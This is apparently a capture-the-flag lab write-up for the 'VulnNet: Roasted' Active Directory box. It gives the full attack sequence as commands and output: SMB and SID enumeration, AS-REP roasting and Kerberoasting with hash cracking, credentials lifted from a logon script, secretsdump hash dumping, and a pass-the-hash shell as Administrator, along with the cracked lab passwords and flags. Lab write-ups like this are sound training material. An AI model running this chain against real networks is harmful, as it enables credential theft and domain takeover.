> Vulnet: Roasted

# Nmap

nmap -sC -sV -T4 -Pn -A -vvv $IP -oN nmap/initial

```bash
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-06-01 15:06:00Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB

smbclient -L \\\\10.10.52.234

```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
```

We got some interesting files in `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous` shares. All the text file contained some usernames and details. Now let's find some usernames. Also we got `IPC$` share readable which contains many files as well.

# Username Enumeration

python3 /opt/impacket/examples/lookupsid.py anonymous@$IP

```bash
[*] Brute forcing SIDs at 10.10.75.240
[*] StringBinding ncacn_np:10.10.75.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

We got some users let's put them in a file users.txt .Since kerberos is active let's give a try for ASREP Roasting and retrive hashes.

python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -no-pass -usersfile users.txt

```bash
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:63b933ce8adae4439762ad47e002d98f$69db584a1ce29a63a01bba3bd298ee4cbfe75536c1935bd5bdffa9382d0687bef868a8a7c86d98472321395688f05cfa66d427bb2667312dfbb94b1342589b5e2bc858a629a218732813b26987b6b9294eceacb26a255cbb6be9569f782a5cbaa01fc509b20d06b955495e5930ca6679e14f901103a182c12c70dd78f9162de47325d7df454820d558d26cf90c76448e0b14f7f28f1558955c2b19ceebc7bba5d1d1871fec1613dd8b7ceffa794e239ac1cad5409cdb8452bf0dbb4032c329a70199bc06706a4825d14782dbe8a0a50e51a1f711bf37de8709f34cf264c9ce4cbe6eb7e8f12be99c9734c58be5cb4607
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We got `t-skid`'s hash. Let's crack it using hashcat!

hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

```
tj072889*
```

Let's now try kerberoasting to find and fetch service Principal Names that are associated with normal users account.

```bash
python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile kerb.hash -dc-ip $IP
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528
```

We can identify the hash using john too `john --show=formats kerb.hash`

john --format=krb5tgs kerb.hash --wordlist=/usr/share/wordlists/rockyou.txt

```bash
ry=ibfkfv,s6h,   (?)
```

Since we have winrm enabled let's try to get into it.

evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i $IP

We are in!! But before that I also used t-skid's password to getinto SMB and found an interesting file `ResetPassword.vbs` in NETLOGON share.

```bash
smbmap -H $IP -u t-skid -p "tj072889*" -R

NETLOGON                                          	READ ONLY	Logon server share 
.\NETLOGON\*
dr--r--r--                0 Tue Mar 16 19:15:49 2021	.
dr--r--r--                0 Tue Mar 16 19:15:49 2021	..
fr--r--r--             2821 Tue Mar 16 19:18:14 2021	ResetPassword.vbs
```

smbget -U t-skid -R smb://$IP/NETLOGON/ResetPassword.vbs -v

And in that file we got some password.

```
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

We can get a shell using wimexec too.

wmiexec.py vulnnet-rst.local/a-whitehat@$IP

And we are in!! Either way we can get our user flag!!

# user.txt

```
THM{726b7c0baaac1455d05c827b5561f4ed}
```

So moving again to SMB but now as a-whitehat.

smbmap -H $IP -u a-whitehat -p "bNdKVkjv3RR9ht" 

```bash
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        SYSVOL                                                  READ, WRITE     Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

And since we have write access to SMB as admin we can try to dump hashes using secretsdump.py.

python3 /opt/impacket/examples/secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@$IP

```bash
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Since we have admin hash we can pass the hash to evil-winrm and gain a shell!

evil-winrm -u 'Administrator' -H "c2597747aa5e43022a3a3049a3c3b09d" -i $IP

And we are in as Administrator!

# system.txt

```
THM{16f45e3934293a57645f8d7bf71d8d4c}
```